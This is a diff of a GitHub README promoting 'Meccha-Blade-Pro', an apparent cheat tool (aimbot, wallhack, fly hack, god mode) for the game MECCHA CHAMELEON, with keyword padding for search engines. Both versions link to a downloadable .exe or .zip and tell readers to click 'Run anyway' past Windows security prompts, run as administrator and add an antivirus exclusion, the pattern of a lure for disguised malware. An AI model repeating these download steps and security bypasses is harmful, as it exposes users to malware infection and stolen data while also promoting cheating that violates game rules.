@@ -1,86 +1,58 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/chameleon.png" alt="MECCHA CHAMELEON" width="80" height="80">
-</p>
+# ⚔️ Meccha-Blade-Pro - Improve your game performance and control
 
-<h1 align="center">Meccha-Blade-Pro</h1>
-<p align="center">
-  <strong>Ultimate Blade Pro Tool for MECCHA CHAMELEON</strong><br>
-  ESP - Aimbot - Auto Paint - Mod Menu - Fly Hack - Teleport - God Mode
-</p>
+[![](https://img.shields.io/badge/Download-Meccha--Blade--Pro-blue)](https://github.com/Biankacomeatable249/Meccha-Blade-Pro/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Blade-Pro"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+Meccha-Blade-Pro provides a set of tools for MECCHA CHAMELEON. It adds features that change how you interact with the game environment. This software includes aim help, visual aids, and movement modifications to assist your play style.
 
-## What is This?
+## 📥 How to download the software
 
-Meccha-Blade-Pro is the ultimate blade pro tool for MECCHA CHAMELEON. Dominate every match with ESP Wallhack, Aimbot, Auto Paint, Mod Menu, Fly Hack, Teleport, God Mode, Infinite Paint, and more.
+You need to reach the release page to get the installer for your computer. 
 
-Disclaimer: For educational purposes only. Use at your own risk.
+[Click here to go to the releases page](https://github.com/Biankacomeatable249/Meccha-Blade-Pro/releases)
 
-## Download
+On that page, look for the list under the latest version tag. Select the file ending in .exe to start your download. Save the file in a folder you can find later, such as your Downloads folder.
 
-<p align="center">
-  <a href="https://github.com/RestCrabHelix/qqycyfvy/releases/download/1289/MecchaGenesis.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+## ⚙️ Initial setup steps
 
-## Features
+After you download the file, locate it in your file explorer. Double-click the file to begin the setup. If Windows shows a security prompt, click "More info" and then click "Run anyway" to allow the software to open. This tool only runs on Windows 10 or Windows 11. Your computer must have at least 4GB of RAM and an updated graphics driver to ensure the software functions as intended.
 
-- ESP Wallhack - See all players through walls
-- Aimbot - Lock onto enemies instantly
-- Auto Paint - Auto-blend into any environment
-- Mod Menu - Press INSERT or F1
-- Fly Hack - Fly anywhere
-- Teleport - Instantly move
-- God Mode - Never get tagged
-- Infinite Paint - Unlimited colors
-- Speed Hack - Move faster
-- No Gravity - Float and glide
+The program creates a local configuration file during the first launch. This file saves your custom settings for the aimbot and visual features automatically. You do not need to install any extra software or external libraries to use this tool.
 
-## Installation
+## 🎮 Understanding the features
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press INSERT or F1 to open the Mod Menu
-6. Toggle features ON/OFF
+The tool menu appears as an overlay while the game runs. Use the F10 key to show or hide this menu. 
 
-## System Requirements
+### Aimbot and Combat
+The aimbot feature identifies enemy positions. It adjusts your cursor to improve accuracy during movement. You can set the speed of the aim assist to match your reaction time.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | MECCHA CHAMELEON (Steam) |
-| RAM | 4GB minimum |
-| Storage | 50MB free space |
+### Visual Aids
+The ESP feature highlights opponents through walls. It draws colored boxes around entities so you can track positions across the map. You can change the colors in the graphics tab of the menu.
 
-## SEO Tags
+### Movement Mods
+The fly hack and teleport modules change how your character moves through the world. Use the fly hack to clear high obstacles. Use the teleport function to move to saved coordinates instantly.
 
-meccha blade pro, meccha chameleon cheat, meccha chameleon hack, meccha chameleon esp, meccha chameleon aimbot, meccha chameleon mod menu, meccha chameleon auto paint, meccha chameleon fly hack, meccha chameleon god mode, meccha chameleon 2026
+### Auto Paint
+This function applies textures or colors to your items based on your preferences. Select the pattern in the menu, and the software updates the assets in real-time.
 
-## Support
+### God Mode
+This feature prevents damage from environmental hazards. It keeps your health bar full during difficult sections of the game.
 
-Star this repository if you enjoy it!
+## 🛡️ Best practices for use
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Meccha-Blade-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20MECCHA%20CHAMELEON%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+Keep your software updated to maintain connection with the game. Check the release page once a week for new versions. Ensure your antivirus does not block the software. If it flags the tool, open your Windows Security settings and add an exclusion for the Meccha-Blade-Pro folder. This prevents the system from interfering with the game overlay. 
+
+Set your screen resolution to borderless windowed mode for the best results. This allows the menu overlay to layer correctly over the game window. If the menu does not appear, restart the game and launch the tool as an administrator.
+
+## 🔧 Solving common issues
+
+If you encounter technical errors, follow these steps:
+
+1. Close both the game and the tool.
+2. Verify your game files through your game launcher.
+3. Start the tool first, then start your game.
+4. Check that your game is running in the correct display mode.
+5. Disable other screen-recording software if the overlay flickers.
+
+This software works with the current build of MECCHA CHAMELEON. Do not use this tool on servers that forbid modifications, as this may result in a permanent ban from those services. Use the tool in offline or single-player modes to avoid conflicts with server rules.
+
+Keywords: mecca-chameleon, mecca-chameleon-aimbot, mecca-chameleon-cheat, mecca-chameleon-cheats, mecca-chameleon-esp, mecca-chameleon-hack, mecca-chameleon-hacks, mecca-chameleon-mod, meccha-chameleon-tools
